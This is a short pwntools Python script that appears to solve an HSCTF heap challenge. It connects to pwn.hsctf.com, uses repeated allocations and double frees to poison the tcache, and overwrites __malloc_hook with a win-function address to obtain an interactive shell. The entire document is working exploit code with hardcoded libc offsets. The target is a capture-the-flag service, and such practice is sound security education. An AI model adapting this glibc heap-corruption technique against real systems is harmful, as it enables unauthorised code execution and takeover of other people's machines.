from pwn import *

def create(size,data):
    r.sendlineafter('pls > ','1')
    r.sendlineafter('pls > ',str(size))
    r.sendafter('tho > ',data)

def delete():
    r.sendlineafter('pls > ','2')

def get_shell(size):
    r.sendlineafter('pls > ','1')
    r.sendlineafter('pls > ',str(size))

###Addr
win_func = 0x4008a7
main_arena_offset = 0x3ebc40
unsorted_bin_offset = main_arena_offset+0x60
malloc_hook = 0x3ebc30

###Exploit
r = remote('pwn.hsctf.com',2468)
r.sendlineafter('name > ','M30W')

#Align + prepare block
create(0x98,b'a')       #260
create(0x18,b'a')       #300
delete()
delete()

create(0x28,b'a')       #320
delete()
delete()

#Flood tcache
create(0x88,b'a')       #350
delete()
create(0x38,b'a')       #3e0
create(0x88,b'a')       #350
delete()
delete()
delete()
delete()
delete()
delete()
delete()
delete()

create(0x28,b'\x60')    #320
create(0x28,b'a')       #320
create(0x28,b'\x30')    #350

###Hijack
create(0x18,b'\x60')    #300
create(0x18,b'a')       #300
create(0x18,b'a')       #350
create(0x18,p64(win_func))  #malloc_hook

get_shell(0x10)


r.interactive()
